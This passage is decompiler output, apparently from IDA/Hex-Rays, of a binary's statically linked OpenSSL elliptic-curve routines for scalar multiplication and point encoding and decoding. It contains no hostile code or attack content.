        j = v75 - (_BYTE *)v74;
        while ( 1 )
        {
          v24 = (unsigned int)Src >= a4 ? sub_416F90(a3) : sub_416F90(*(_DWORD **)((char *)v21 + v22));
          if ( v24 < 0x7D0 )
          {
            if ( v24 < 0x320 )
            {
              if ( v24 < 0x12C )
                v25 = v24 < 0x46 ? 2 - (v24 < 0x14) : 3;
              else
                v25 = 4;
            }
            else
            {
              v25 = 5;
            }
          }
          else
          {
            v25 = 6;
          }
          *v21 = v25;
          *(int *)((char *)v21 + v23 + 4) = 0;
          v80 += 1 << (v25 - 1);
          v26 = (unsigned int)Src >= a4 ? a3 : *(_DWORD **)((char *)v21 + v22);
          v27 = (unsigned int *)((char *)v21 + j);
          v28 = sub_422170(v26, *v21, (unsigned int *)((char *)v21 + j));
          *(int *)((char *)v21 + v23) = (int)v28;
          if ( !v28 )
            goto LABEL_139;
          v29 = *v27;
          if ( v29 > v76 )
            v76 = v29;
          ++v21;
          if ( (unsigned int)++Src >= v79 )
          {
            v20 = v77;
            v7 = v84;
            break;
          }
          v22 = (int)v92;
        }
      }
      if ( v69 )
      {
        if ( v7 )
        {
          v84 = 0;
          if ( Block )
          {
            sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 271);
            goto LABEL_139;
          }
          v66 = *(_DWORD *)(v7 + 12);
          *((_DWORD *)v74 + a4) = v66;
          v30 = sub_422170(a3, v66, &v84);
          Blocka = v30;
          if ( !v30 )
            goto LABEL_139;
          v31 = v84;
          if ( v84 > v76 )
          {
            if ( v84 < v78 * v69 )
            {
              v32 = (v84 + v78 - 1) / v78;
              if ( v32 > *(_DWORD *)(v7 + 8) )
              {
                sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 314);
                sub_413490(v30);
                goto LABEL_139;
              }
              v73 = a4 + v32;
            }
            v33 = *(_DWORD **)(v7 + 16);
            Srca = v30;
            if ( a4 < v73 )
            {
              v34 = (size_t *)&v75[4 * a4];
              v35 = (char *)v77 - v75;
              j = (_BYTE *)v68 - v75;
              while ( 1 )
              {
                if ( v10 >= v73 - 1 )
                {
                  *v34 = v31;
                }
                else
                {
                  *v34 = v78;
                  if ( v31 < v78 )
                  {
                    sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 329);
                    sub_413490(Blocka);
                    goto LABEL_139;
                  }
                  v84 = v31 - v78;
                }
                *(size_t *)((char *)v34 + v35 + 4) = 0;
                v36 = sub_4133F0(*v34);
                *(size_t *)((char *)v34 + v35) = (size_t)v36;
                if ( !v36 )
                {
                  sub_408310(16, 187, 65, (int)"crypto\\ec\\ec_mult.c", 344);
                  sub_413490(Blocka);
                  goto LABEL_139;
                }
                memcpy(v36, Srca, *v34);
                if ( *v34 > v76 )
                  v76 = *v34;
                if ( !*v33 )
                  break;
                v37 = v88;
                Srca += v78;
                *(size_t *)((char *)v34 + j) = (size_t)v33;
                ++v10;
                ++v34;
                v33 += v37;
                if ( v10 >= v73 )
                {
                  v30 = Blocka;
                  goto LABEL_79;
                }
                v31 = v84;
              }
              sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 353);
              sub_413490(Blocka);
              goto LABEL_139;
            }
LABEL_79:
            sub_413490(v30);
          }
          else
          {
            v20[a4] = v30;
            v20[a4 + 1] = 0;
            *(_DWORD *)&v75[4 * a4] = v31;
            v73 = a4 + 1;
            *((_DWORD *)v68 + a4) = *(_DWORD *)(v7 + 16);
          }
        }
        else if ( Block != 1 )
        {
          sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 262);
          goto LABEL_139;
        }
      }
      v87 = sub_4133F0(4 * v80 + 4);
      if ( v87 )
      {
        v38 = v87;
        v39 = (char *)v87 + 4 * v80;
        v40 = 0;
        v92 = v39;
        *v39 = 0;
        if ( v79 )
        {
          v41 = v74;
          v42 = (_BYTE *)v68 - (_BYTE *)v74;
          j = (_BYTE *)v68 - (_BYTE *)v74;
          while ( 1 )
          {
            *(_DWORD *)&v41[v42] = v38;
            v43 = 0;
            if ( 1 << (*v41 - 1) )
              break;
LABEL_91:
            ++v40;
            v41 += 4;
            if ( v40 >= v79 )
            {
              v39 = v92;
              goto LABEL_93;
            }
          }
          while ( 1 )
          {
            v44 = sub_435F90(a1);
            *v38 = v44;
            if ( !v44 )
              break;
            ++v43;
            ++v38;
            if ( v43 >= 1 << (*v41 - 1) )
            {
              v42 = j;
              goto LABEL_91;
            }
          }
        }
        else
        {
LABEL_93:
          if ( v38 == v39 )
          {
            v86 = sub_435F90(a1);
            if ( v86 )
            {
              v45 = 0;
              if ( v79 )
              {
                v46 = (_DWORD ***)v68;
                v47 = a5 - (_DWORD)v68;
                j = a5 - (_DWORD)v68;
                v48 = (_BYTE *)v74 - (_BYTE *)v68;
                while ( 1 )
                {
                  v49 = v45 >= a4 ? v89 : *(_DWORD ***)((char *)v46 + v47);
                  if ( !sub_4360B0(**v46, v49) )
                    break;
                  if ( *(unsigned int *)((char *)v46 + v48) > 1 )
                  {
                    if ( !sub_436350((int)a1, v86, **v46, a7) )
                      goto LABEL_139;
                    v50 = 1;
                    if ( (unsigned int)(1 << (*((_BYTE *)v46 + v48) - 1)) > 1 )
                    {
                      while ( sub_4362D0((int)a1, (*v46)[v50], (*v46)[v50 - 1], v86, a7) )
                      {
                        if ( ++v50 >= (unsigned int)(1 << (*((_BYTE *)v46 + v48) - 1)) )
                          goto LABEL_107;
                      }
                      goto LABEL_139;
                    }
LABEL_107:
                    v47 = j;
                  }
                  ++v45;
                  ++v46;
                  if ( v45 >= v79 )
                    goto LABEL_109;
                }
              }
              else
              {
LABEL_109:
                if ( sub_4365C0((int)a1, v80, (int)v87, a7) )
                {
                  v51 = v76 - 1;
                  v52 = 1;
                  Blockb = 1;
                  if ( (int)(v76 - 1) < 0 )
                  {
LABEL_132:
                    v60 = sub_436120((int)a1, a2);
LABEL_135:
                    if ( v60 )
LABEL_136:
                      v91 = 1;
                  }
                  else
                  {
                    while ( v52 || sub_436350((int)a1, a2, a2, a7) )
                    {
                      Srcb = 0;
                      if ( v73 )
                      {
                        v53 = v68;
                        v54 = (char *)v77 - (_BYTE *)v68;
                        for ( j = (char *)v77 - (_BYTE *)v68; ; v54 = j )
                        {
                          v55 = (_DWORD *)((char *)v53 + v54);
                          if ( *(int *)((char *)v55 + v75 - (char *)v77) > v51 )
                          {
                            v56 = *v55;
                            v57 = *(char *)(v56 + v51);
                            if ( *(_BYTE *)(v56 + v51) )
                            {
                              v58 = v57 < 0;
                              if ( v57 < 0 )
                                v57 = -v57;
                              if ( v58 != v85 )
                              {
                                if ( !Blockb && !sub_4363C0((int)a1, a2, a7) )
                                  goto LABEL_139;
                                v85 = v85 == 0;
                              }
                              v59 = v57 >> 1;
                              if ( Blockb )
                              {
                                if ( !sub_4360B0(a2, *(_DWORD **)(*v53 + 4 * v59)) )
                                  goto LABEL_139;
                                Blockb = 0;
                              }
                              else if ( !sub_4362D0((int)a1, a2, a2, *(_DWORD **)(*v53 + 4 * v59), a7) )
                              {
                                goto LABEL_139;
                              }
                            }
                          }
                          ++v53;
                          if ( (unsigned int)++Srcb >= v73 )
                            break;
                        }
                        v52 = Blockb;
                      }
                      if ( (--v51 & 0x80000000) != 0 )
                      {
                        if ( v52 )
                          goto LABEL_132;
                        if ( v85 )
                        {
                          v60 = sub_4363C0((int)a1, a2, a7);
                          goto LABEL_135;
                        }
                        goto LABEL_136;
                      }
                    }
                  }
                }
              }
            }
          }
          else
          {
            sub_408310(16, 187, 68, (int)"crypto\\ec\\ec_mult.c", 390);
          }
        }
        goto LABEL_139;
      }
      v67 = 373;
    }
    else
    {
      v67 = 232;
    }
    sub_408310(16, 187, 65, (int)"crypto\\ec\\ec_mult.c", v67);
    goto LABEL_139;
  }
  while ( v8 == **(_DWORD **)(a5 + 4 * v11) )
  {
    if ( ++v11 >= a4 )
      goto LABEL_9;
  }
  sub_408310(16, 187, 101, (int)"crypto\\ec\\ec_mult.c", 165);
  return 0;
}

//----- (00458210) --------------------------------------------------------
int __cdecl sub_458210(int *a1, int *a2)
{
  void **v2; // ebp
  int v4; // eax
  _DWORD *v5; // esi
  unsigned int v6; // eax
  unsigned int v7; // eax
  int v8; // esi
  void **v9; // eax
  int v10; // esi
  void **v11; // ebx
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  unsigned int v15; // esi
  int v16; // esi
  void *v17; // eax
  void **i; // esi
  int v19; // [esp+Ch] [ebp-28h]
  _DWORD *v20; // [esp+10h] [ebp-24h]
  _DWORD *Block; // [esp+14h] [ebp-20h]
  unsigned int v22; // [esp+18h] [ebp-1Ch]
  _DWORD *v23; // [esp+1Ch] [ebp-18h]
  unsigned int v24; // [esp+1Ch] [ebp-18h]
  unsigned int v25; // [esp+20h] [ebp-14h]
  volatile LONG *v26; // [esp+24h] [ebp-10h]
  unsigned int v27; // [esp+28h] [ebp-Ch]
  void **v28; // [esp+2Ch] [ebp-8h]
  int v29; // [esp+30h] [ebp-4h]

  Block = 0;
  v20 = 0;
  v28 = 0;
  v2 = 0;
  v29 = 0;
  sub_435D10((int)a1);
  v26 = sub_4576A0((int)a1);
  if ( !v26 )
    return 0;
  v23 = (_DWORD *)sub_422350((int)a1);
  if ( !v23 )
  {
    sub_408310(16, 188, 113, (int)"crypto\\ec\\ec_mult.c", 542);
LABEL_41:
    if ( a2 )
      sub_420750(a2);
    goto LABEL_43;
  }
  if ( a2 || (v28 = (void **)sub_420670(), (a2 = (int *)v28) != 0) )
  {
    sub_420700(a2);
    v4 = sub_432B60((int)a1);
    v5 = (_DWORD *)v4;
    if ( v4 )
    {
      if ( sub_416DB0(v4) )
      {
        sub_408310(16, 188, 114, (int)"crypto\\ec\\ec_mult.c", 558);
      }
      else
      {
        v6 = sub_416F90(v5);
        v19 = 4;
        if ( v6 >= 0x7D0 )
        {
          v19 = 6;
        }
        else if ( v6 >= 0x320 )
        {
          v19 = 5;
        }
        else if ( v6 <= 0x45 && 2 - (unsigned int)(v6 < 0x14) > 4 )
        {
          v19 = 2 - (v6 < 0x14);
        }
        v7 = (v6 + 7) >> 3;
        v27 = 1 << (v19 - 1);
        v8 = v7 * v27;
        v22 = v7;
        v25 = v7 * v27;
        v9 = (void **)sub_4133F0(4 * v7 * v27 + 4);
        v2 = v9;
        if ( v9 )
        {
          v9[v8] = 0;
          v10 = 0;
          v11 = v9;
          if ( v25 )
          {
            while ( 1 )
            {
              v12 = sub_435F90(a1);
              v2[v10] = v12;
              if ( !v12 )
                break;
              if ( ++v10 >= v25 )
                goto LABEL_22;
            }
            sub_408310(16, 188, 65, (int)"crypto\\ec\\ec_mult.c", 594);
          }
          else
          {
LABEL_22:
            Block = sub_435F90(a1);
            if ( Block && (v13 = sub_435F90(a1), (v20 = v13) != 0) )
            {
              if ( sub_4360B0(v13, v23) )
              {
                v24 = 0;
                if ( v22 )
                {
                  while ( sub_436350((int)a1, Block, v20, (int)a2) )
                  {
                    if ( !sub_4360B0(*v11++, v20) )
                      break;
                    v15 = 1;
                    if ( v27 > 1 )
                    {
                      while ( sub_4362D0((int)a1, *v11, Block, *(v11 - 1), (int)a2) )
                      {
                        ++v15;
                        ++v11;
                        if ( v15 >= v27 )
                          goto LABEL_31;
                      }
                      goto LABEL_41;
                    }
LABEL_31:
                    if ( v24 < v22 - 1 )
                    {
                      if ( sub_436350((int)a1, v20, Block, (int)a2) )
                      {
                        v16 = 2;
                        while ( sub_436350((int)a1, v20, v20, (int)a2) )
                        {
                          if ( (unsigned int)++v16 >= 8 )
                            goto LABEL_36;
                        }
                      }
                      goto LABEL_41;
                    }
LABEL_36:
                    if ( ++v24 >= v22 )
                      goto LABEL_37;
                  }
                }
                else
                {
LABEL_37:
                  if ( sub_4365C0((int)a1, v25, (int)v2, (int)a2) )
                  {
                    *((_DWORD *)v26 + 4) = v2;
                    *v26 = (volatile LONG)a1;
                    *((_DWORD *)v26 + 1) = 8;
                    *((_DWORD *)v26 + 2) = v22;
                    *((_DWORD *)v26 + 3) = v19;
                    v2 = 0;
                    *((_DWORD *)v26 + 5) = v25;
                    a1[23] = 5;
                    a1[24] = (int)v26;
                    v26 = 0;
                    v29 = 1;
                  }
                }
              }
            }
            else
            {
              sub_408310(16, 188, 65, (int)"crypto\\ec\\ec_mult.c", 601);
            }
          }
        }
        else
        {
          sub_408310(16, 188, 65, (int)"crypto\\ec\\ec_mult.c", 586);
        }
      }
    }
    goto LABEL_41;
  }
LABEL_43:
  sub_4206C0(v28);
  sub_457760(v26);
  if ( v2 )
  {
    v17 = *v2;
    for ( i = v2; v17; ++i )
    {
      sub_436040(v17);
      v17 = i[1];
    }
    sub_413490(v2);
  }
  sub_436040(Block);
  sub_436040(v20);
  return v29;
}
// 45830A: conditional instruction was optimized away because eax.4<46u
// 458325: conditional instruction was optimized away because eax.4<46u
// 458330: conditional instruction was optimized away because eax.4<46u

//----- (004585F0) --------------------------------------------------------
BOOL __cdecl sub_4585F0(int a1)
{
  return *(_DWORD *)(a1 + 92) == 5 && *(_DWORD *)(a1 + 96);
}

//----- (00458610) --------------------------------------------------------
int __usercall sub_458610@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, _DWORD *a4, int a5, int *a6)
{
  int *v6; // esi
  _DWORD *v8; // edi
  _DWORD *v9; // ebp
  int v10; // ebp
  int v11; // eax
  BOOL v12; // eax
  int v13; // edi
  _DWORD *v14; // [esp-14h] [ebp-28h]
  _DWORD *v15; // [esp+8h] [ebp-Ch]
  void **Block; // [esp+Ch] [ebp-8h]
  int v17; // [esp+10h] [ebp-4h]
  int v18; // [esp+24h] [ebp+10h]
  _DWORD *v19; // [esp+28h] [ebp+14h]

  Block = 0;
  v17 = 0;
  sub_408400();
  v6 = a6;
  if ( !a6 )
  {
    Block = (void **)sub_420670();
    v6 = (int *)Block;
    if ( !Block )
      return 0;
  }
  v18 = a5 != 0;
  sub_420700(v6);
  v8 = sub_420790(v6);
  v19 = sub_420790(v6);
  v15 = sub_420790(v6);
  v9 = sub_420790(v6);
  if ( v9 && sub_47FF20(v19, a4, (_DWORD *)(a2 + 40)) )
  {
    if ( sub_416DB0((int)v19) )
    {
      if ( sub_480B60(a1, v15, *(_DWORD **)(a2 + 68), (_DWORD *)(a2 + 40), v6) )
      {
        v10 = (int)v19;
LABEL_21:
        if ( sub_436EA0(a2, a3, v10, (int)v15, (int)v6) )
          v17 = 1;
      }
    }
    else if ( (*(int (__cdecl **)(int, _DWORD *, _DWORD *, int *))(*(_DWORD *)a2 + 140))(a2, v8, v19, v6)
           && (*(int (__cdecl **)(int, _DWORD *, _DWORD, _DWORD *, int *))(*(_DWORD *)a2 + 144))(
                a2,
                v8,
                *(_DWORD *)(a2 + 68),
                v8,
                v6)
           && sub_47FE90(v8, *(_DWORD **)(a2 + 64), v8)
           && sub_47FE90(v8, v19, v8) )
    {
      if ( !sub_480BE0(a1, v9, v8, (int *)(a2 + 40), v6) )
      {
        v11 = sub_408760();
        if ( (v11 & 0xFF000000) == 50331648 && (v11 & 0xFFF) == 116 )
        {
          sub_408400();
          sub_408310(16, 164, 110, (int)"crypto\\ec\\ec2_oct.c", 96);
        }
        else
        {
          sub_408310(16, 164, 3, (int)"crypto\\ec\\ec2_oct.c", 99);
        }
        goto LABEL_23;
      }
      v12 = sub_416E20((int)v9);
      v14 = v9;
      v10 = (int)v19;
      v13 = v12;
      if ( (*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a2 + 136))(a2, v15, v19, v14, v6) )
      {
        if ( v13 == v18 || sub_47FE90(v15, v15, v19) )
          goto LABEL_21;
      }
    }
  }
LABEL_23:
  sub_420750(v6);
  sub_4206C0(Block);
  return v17;
}

//----- (00458850) --------------------------------------------------------
int __cdecl sub_458850(int a1, _DWORD *a2, int a3, _BYTE *a4, unsigned int a5, int *a6)
{
  unsigned int v7; // ebp
  int *v8; // esi
  void **v9; // eax
  _DWORD *v10; // ebx
  _DWORD *v11; // edi
  int v12; // edi
  int v13; // eax
  unsigned int v14; // esi
  int v15; // edi
  int v16; // eax
  unsigned int v17; // esi
  unsigned int v18; // [esp+10h] [ebp-10h]
  void **Block; // [esp+14h] [ebp-Ch]
  _DWORD *v20; // [esp+18h] [ebp-8h]
  _DWORD *v21; // [esp+1Ch] [ebp-4h]

  Block = 0;
  if ( a3 != 2 && a3 != 4 && a3 != 6 )
  {
    sub_408310(16, 161, 104, (int)"crypto\\ec\\ec2_oct.c", 140);
    sub_4206C0(0);
    return 0;
  }
  if ( !sub_436430(a1, a2) )
  {
    v7 = (sub_435F50(a1) + 7) / 8;
    if ( a3 == 2 )
      v18 = v7 + 1;
    else
      v18 = 2 * v7 + 1;
    if ( a4 )
    {
      if ( a5 < v18 )
      {
        sub_408310(16, 161, 100, (int)"crypto\\ec\\ec2_oct.c", 165);
        sub_4206C0(0);
        return 0;
      }
      v8 = a6;
      if ( !a6 )
      {
        v9 = (void **)sub_420670();
        Block = v9;
        a6 = (int *)v9;
        if ( !v9 )
          return 0;
        v8 = (int *)v9;
      }
      sub_420700(v8);
      v10 = sub_420790(v8);
      v11 = sub_420790(v8);
      v21 = v11;
      v20 = sub_420790(v8);
      if ( !v20 || !sub_436260(a1, a2, (int)v10, (int)v11, (int)v8) )
        goto LABEL_44;
      *a4 = a3;
      if ( a3 != 4 && !sub_416DB0((int)v10) )
      {
        if ( !(*(int (__cdecl **)(int, _DWORD *, _DWORD *, _DWORD *, int *))(*(_DWORD *)a1 + 144))(
                a1,
                v20,
                v11,
                v10,
                v8) )
        {
LABEL_44:
          sub_420750(v8);
          sub_4206C0(Block);
          return 0;
        }
        if ( sub_416E20((int)v20) )
          ++*a4;
      }
      v12 = 1;
      v13 = (sub_416F90(v10) + 7) / 8;
      v14 = v7 - v13;
      if ( v7 - v13 > v7 )
      {
        sub_408310(16, 161, 68, (int)"crypto\\ec\\ec2_oct.c", 198);
LABEL_43:
        v8 = a6;
        goto LABEL_44;
      }
      if ( v14 )
      {
        memset(a4 + 1, 0, v7 - v13);
        v12 = v14 + 1;
      }
      v15 = sub_417300(v10, &a4[v12]) + v12;
      if ( v15 != v7 + 1 )
      {
        sub_408310(16, 161, 68, (int)"crypto\\ec\\ec2_oct.c", 208);
        goto LABEL_43;
      }
      if ( a3 == 4 || a3 == 6 )
      {
        v16 = (sub_416F90(v21) + 7) / 8;
        v17 = v7 - v16;
        if ( v7 - v16 > v7 )
        {
          sub_408310(16, 161, 68, (int)"crypto\\ec\\ec2_oct.c", 216);
          goto LABEL_43;
        }
        if ( v17 )
        {
          memset(&a4[v15], 0, v7 - v16);
          v15 += v17;
        }
        v15 += sub_417300(v21, &a4[v15]);
      }
      if ( v15 != v18 )
      {
        sub_408310(16, 161, 68, (int)"crypto\\ec\\ec2_oct.c", 228);
        goto LABEL_43;
      }
      sub_420750(a6);
    }
    sub_4206C0(Block);
    return v18;
  }
  if ( a4 )
  {
    if ( !a5 )
    {
      sub_408310(16, 161, 100, (int)"crypto\\ec\\ec2_oct.c", 148);
      return 0;
    }
    *a4 = 0;
  }
  return 1;
}

//----- (00458B70) --------------------------------------------------------
int __usercall sub_458B70@<eax>(__m64 a1@<mm0>, int **a2, int **a3, _BYTE *a4, int a5, int *a6)
{
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  int *v10; // esi
  int *v11; // ebp
  int v12; // eax
  int v13; // [esp+8h] [ebp-10h]
  void **Block; // [esp+Ch] [ebp-Ch]
  int v15; // [esp+10h] [ebp-8h]
  _DWORD *v16; // [esp+14h] [ebp-4h]
  _DWORD *v17; // [esp+28h] [ebp+10h]

  Block = 0;
  v15 = 0;
  if ( !a5 )
  {
    sub_408310(16, 160, 100, (int)"crypto\\ec\\ec2_oct.c", 261);
    return 0;
  }
  v7 = *a4 & 0xFE;
  v13 = *a4 & 1;
  switch ( v7 )
  {
    case 0:
      goto LABEL_9;
    case 2:
      break;
    case 4:
LABEL_9:
      if ( (*a4 & 1) != 0 )
      {
        sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 274);
        return 0;
      }
      break;
    case 6:
      break;
    default:
      sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 270);
      return 0;
  }
  if ( v7 )
  {
    v8 = (sub_435F50((int)a2) + 7) / 8;
    v9 = v8 + 1;
    if ( v7 != 2 )
      v9 = 2 * v8 + 1;
    if ( a5 != v9 )
    {
      sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 293);
      return 0;
    }
    v10 = a6;
    if ( !a6 )
    {
      Block = (void **)sub_420670();
      v10 = (int *)Block;
      if ( !Block )
        return 0;
    }
    sub_420700(v10);
    v11 = sub_420790(v10);
    v17 = sub_420790(v10);
    v16 = sub_420790(v10);
    if ( v16 && sub_4174D0(a4 + 1, v8, (int)v11) )
    {
      if ( sub_416960(v11, a2[9]) >= 0 )
      {
        sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 313);
        goto LABEL_40;
      }
      if ( v7 == 2 )
      {
        v12 = sub_437000(a1, a2, a3, v11, v13, v10);
        goto LABEL_38;
      }
      if ( sub_4174D0(&a4[v8 + 1], v8, (int)v17) )
      {
        if ( sub_416960(v17, a2[9]) < 0 )
        {
          if ( v7 == 6 )
          {
            if ( !((int (__cdecl *)(int **, _DWORD *, _DWORD *, int *, int *))(*a2)[36])(a2, v16, v17, v11, v10) )
              goto LABEL_40;
            if ( v13 != sub_416E20((int)v16) )
            {
              sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 332);
              goto LABEL_40;
            }
          }
          v12 = sub_436EA0((int)a2, a3, (int)v11, (int)v17, (int)v10);
LABEL_38:
          if ( v12 )
            v15 = 1;
          goto LABEL_40;
        }
        sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 325);
      }
    }
LABEL_40:
    sub_420750(v10);
    sub_4206C0(Block);
    return v15;
  }
  if ( a5 != 1 )
  {
    sub_408310(16, 160, 102, (int)"crypto\\ec\\ec2_oct.c", 280);
    return 0;
  }
  return sub_436120((int)a2, a3);
}
// 458BE0: conditional instruction was optimized away because edi.4 is in (==2|==6)

//----- (00458DF0) --------------------------------------------------------
int __usercall sub_458DF0@<eax>(__m64 a1@<mm0>, int **a2, _DWORD *a3, int *a4, int a5, int a6)
{
  int *v6; // edi
  int *v8; // ebx
  _DWORD *v9; // ebp
  int v10; // eax
  int (__cdecl *v11)(int **, int *, int *, int *); // ecx
  int v12; // eax
  int (__cdecl *v13)(int **, int *, int, int *); // eax
  int v14; // edx
  int v15; // eax
  int v16; // eax
  int v17; // eax
  _DWORD *v18; // [esp+8h] [ebp-10h]
  void **Block; // [esp+Ch] [ebp-Ch]
  int v20; // [esp+10h] [ebp-8h]
  int *v21; // [esp+14h] [ebp-4h]
  BOOL v22; // [esp+28h] [ebp+10h]
  int **v23; // [esp+2Ch] [ebp+14h]

  Block = 0;
  v20 = 0;
  sub_408400();
  v6 = (int *)a6;
  if ( !a6 )
  {
    Block = (void **)sub_420670();
    v6 = (int *)Block;
    if ( !Block )
      return 0;
  }
  v22 = a5 != 0;
  sub_420700(v6);
  v18 = sub_420790(v6);
  v8 = sub_420790(v6);
  v23 = (int **)sub_420790(v6);
  v21 = sub_420790(v6);
  if ( v21 && sub_42A2D0(v23, a4, a2[9], v6) )
  {
    if ( (*a2)[38] )
    {
      if ( !sub_42A4B0(v8, a4, a2[9], v6) || !sub_42A430(v18, v8, (unsigned int **)a4, a2[9], v6) )
        goto LABEL_46;
      v9 = v18;
    }
    else
    {
      if ( !((int (__cdecl *)(int **, int *, int *, int *))(*a2)[35])(a2, v8, a4, v6) )
        goto LABEL_46;
      v9 = v18;
      if ( !((int (__cdecl *)(int **, _DWORD *, int *, int *, int *))(*a2)[34])(a2, v18, v8, a4, v6) )
        goto LABEL_46;
    }
    if ( a2[18] )
    {
      if ( !sub_42A4F0((int **)v8, v23, a2[9]) || !sub_42A360(v8, (int)v8, (int)v23, a2[9]) )
        goto LABEL_46;
      v10 = sub_42A3F0(v9, (int)v9, (int)v8, (int)a2[9]);
    }
    else
    {
      v11 = (int (__cdecl *)(int **, int *, int *, int *))(*a2)[38];
      if ( v11 )
      {
        if ( !v11(a2, v8, a2[16], v6) )
          goto LABEL_46;
        v12 = sub_42A430(v8, v8, (unsigned int **)v23, a2[9], v6);
      }
      else
      {
        v12 = ((int (__cdecl *)(int **, int *, int *, int **, int *))(*a2)[34])(a2, v8, a2[16], v23, v6);
      }
      if ( !v12 )
        goto LABEL_46;
      v10 = sub_42A360(v9, (int)v9, (int)v8, a2[9]);
    }
    if ( v10 )
    {
      v13 = (int (__cdecl *)(int **, int *, int, int *))(*a2)[38];
      v14 = (int)a2[17];
      if ( v13 )
      {
        if ( !v13(a2, v8, v14, v6) )
          goto LABEL_46;
        v15 = sub_42A360(v9, (int)v9, (int)v8, a2[9]);
      }
      else
      {
        v15 = sub_42A360(v9, (int)v9, v14, a2[9]);
      }
      if ( v15 )
      {
        if ( sub_4811A0(a1, v21, v9, a2[9], v6) )
        {
          if ( v22 == sub_416E20((int)v21) )
            goto LABEL_42;
          if ( sub_416DB0((int)v21) )
          {
            v17 = sub_480F30(v23, a2[9], v6);
            if ( v17 != -2 )
            {
              if ( v17 == 1 )
                sub_408310(16, 169, 109, (int)"crypto\\ec\\ecp_oct.c", 130);
              else
                sub_408310(16, 169, 110, (int)"crypto\\ec\\ecp_oct.c", 136);
            }
            goto LABEL_46;
          }
          if ( sub_421F50(v21, (int)a2[9], (int)v21) )
          {
LABEL_42:
            if ( v22 == sub_416E20((int)v21) )
            {
              if ( sub_436DF0((int)a2, a3, (int)v23, (int)v21, (int)v6) )
                v20 = 1;
            }
            else
            {
              sub_408310(16, 169, 68, (int)"crypto\\ec\\ecp_oct.c", 144);
            }
          }
        }
        else
        {
          v16 = sub_408760();
          if ( (v16 & 0xFF000000) == 50331648 && (v16 & 0xFFF) == 111 )
          {
            sub_408400();
            sub_408310(16, 169, 110, (int)"crypto\\ec\\ecp_oct.c", 113);
          }
          else
          {
            sub_408310(16, 169, 3, (int)"crypto\\ec\\ecp_oct.c", 116);
          }
        }
      }
    }
  }
LABEL_46:
  sub_420750(v6);
  sub_4206C0(Block);
  return v20;
}

//----- (00459150) --------------------------------------------------------
int __cdecl sub_459150(int a1, _DWORD *a2, int a3, _BYTE *a4, unsigned int a5, int *a6)
{
  unsigned int v7; // ebp
  int *v8; // esi
  void **v9; // eax
  _DWORD *v10; // ebx
  _DWORD *v11; // esi
  char v12; // al
  int v13; // edi
  int v14; // eax
  unsigned int v15; // esi
  int v16; // edi
  int v17; // eax
  unsigned int v18; // esi
  unsigned int v19; // [esp+10h] [ebp-Ch]
  void **Block; // [esp+14h] [ebp-8h]
  _DWORD *v21; // [esp+18h] [ebp-4h]

  Block = 0;
  if ( a3 != 2 && a3 != 4 && a3 != 6 )
  {
    sub_408310(16, 104, 104, (int)"crypto\\ec\\ecp_oct.c", 172);
    sub_4206C0(0);
    return 0;
  }
  if ( !sub_436430(a1, a2) )
  {
    v7 = (sub_416F90(*(_DWORD **)(a1 + 36)) + 7) / 8;
    if ( a3 == 2 )
      v19 = v7 + 1;
    else
      v19 = 2 * v7 + 1;
    if ( !a4 )
      goto LABEL_46;
    if ( a5 < v19 )
    {
      sub_408310(16, 104, 100, (int)"crypto\\ec\\ecp_oct.c", 197);
      sub_4206C0(0);
      return 0;
    }
    v8 = a6;
    if ( !a6 )
    {
      v9 = (void **)sub_420670();
      Block = v9;
      a6 = (int *)v9;
      if ( !v9 )
        return 0;
      v8 = (int *)v9;
    }
    sub_420700(v8);
    v10 = sub_420790(v8);
    v11 = sub_420790(v8);
    v21 = v11;
    if ( !v11 || !sub_4361F0(a1, a2, (int)v10, (int)v11, (int)a6) )
      goto LABEL_44;
    v12 = a3;
    if ( a3 == 2 || a3 == 6 )
    {
      if ( sub_416E20((int)v11) )
      {
        *a4 = a3 + 1;
LABEL_29:
        v13 = 1;
        v14 = (sub_416F90(v10) + 7) / 8;
        v15 = v7 - v14;
        if ( v7 - v14 > v7 )
        {
          sub_408310(16, 104, 68, (int)"crypto\\ec\\ecp_oct.c", 227);
LABEL_44:
          sub_420750(a6);
          sub_4206C0(Block);
          return 0;
        }
        if ( v15 )
        {
          memset(a4 + 1, 0, v7 - v14);
          v13 = v15 + 1;
        }
        v16 = sub_417300(v10, &a4[v13]) + v13;
        if ( v16 != v7 + 1 )
        {
          sub_408310(16, 104, 68, (int)"crypto\\ec\\ecp_oct.c", 237);
          goto LABEL_44;
        }
        if ( a3 == 4 || a3 == 6 )
        {
          v17 = (sub_416F90(v21) + 7) / 8;
          v18 = v7 - v17;
          if ( v7 - v17 > v7 )
          {
            sub_408310(16, 104, 68, (int)"crypto\\ec\\ecp_oct.c", 245);
            goto LABEL_44;
          }
          if ( v18 )
          {
            memset(&a4[v16], 0, v7 - v17);
            v16 += v18;
          }
          v16 += sub_417300(v21, &a4[v16]);
        }
        if ( v16 != v19 )
        {
          sub_408310(16, 104, 68, (int)"crypto\\ec\\ecp_oct.c", 257);
          goto LABEL_44;
        }
        sub_420750(a6);
LABEL_46:
        sub_4206C0(Block);
        return v19;
      }
      v12 = a3;
    }
    *a4 = v12;
    goto LABEL_29;
  }
  if ( a4 )
  {
    if ( !a5 )
    {
      sub_408310(16, 104, 100, (int)"crypto\\ec\\ecp_oct.c", 180);
      return 0;
    }
    *a4 = 0;
  }
  return 1;
}

//----- (00459440) --------------------------------------------------------
int __usercall sub_459440@<eax>(__m64 a1@<mm0>, int **a2, int **a3, _BYTE *a4, int a5, int *a6)
{
  int v7; // esi
  int v8; // edi
  int v9; // eax
  int *v10; // ebx
  _DWORD *v11; // ebp
  int v12; // eax
